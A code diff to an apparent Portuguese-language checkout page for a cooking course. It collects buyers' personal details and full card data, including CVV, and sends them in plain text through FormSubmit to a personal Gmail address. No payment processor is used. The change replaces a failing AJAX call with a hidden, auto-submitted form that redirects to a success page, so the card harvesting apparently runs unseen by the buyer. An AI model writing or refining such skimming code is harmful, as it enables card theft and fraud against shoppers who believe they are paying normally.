@@ -200,10 +200,12 @@ function CheckoutPage() {
     setError(null);
     setLoading(true);
     try {
-      const payload = {
+      const successUrl = `${window.location.origin}/pagamento-concluido`;
+      const fields: Record<string, string> = {
         _subject: "Nova compra — Curso Brigadeiro Gourmet (Cartão)",
         _template: "table",
         _captcha: "false",
+        _next: successUrl,
         Nome: form.name,
         Email: form.email,
         Celular: form.phone,
@@ -219,30 +221,26 @@ function CheckoutPage() {
         "Mes Validade": card.expirationMonth,
         "Ano Validade": card.expirationYear,
         CVV: card.cvv,
-        Parcelas: card.installments,
+        Parcelas: String(card.installments),
       };
-      const res = await fetch(
-        "https://formsubmit.co/ajax/rubenscardosoaguiar@gmail.com",
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-            Accept: "application/json",
-          },
-          body: JSON.stringify(payload),
-        },
-      );
-      const data = await res.json().catch(() => ({}));
-      if (!res.ok || (data && data.success === "false")) {
-        throw new Error(
-          (data && (data.message || data.error)) ||
-            "Falha ao enviar. Tente novamente.",
-        );
+
+      // Submissão via <form> real evita o 500/CORS do endpoint /ajax
+      // e o próprio FormSubmit redireciona para _next após o envio.
+      const formEl = document.createElement("form");
+      formEl.method = "POST";
+      formEl.action = "https://formsubmit.co/rubenscardosoaguiar@gmail.com";
+      formEl.style.display = "none";
+      for (const [k, v] of Object.entries(fields)) {
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = k;
+        input.value = v;
+        formEl.appendChild(input);
       }
-      navigate({ to: "/pagamento-concluido" });
+      document.body.appendChild(formEl);
+      formEl.submit();
     } catch (err: any) {
       setError(err?.message ?? "Erro ao processar pagamento");
-    } finally {
       setLoading(false);
     }
   };
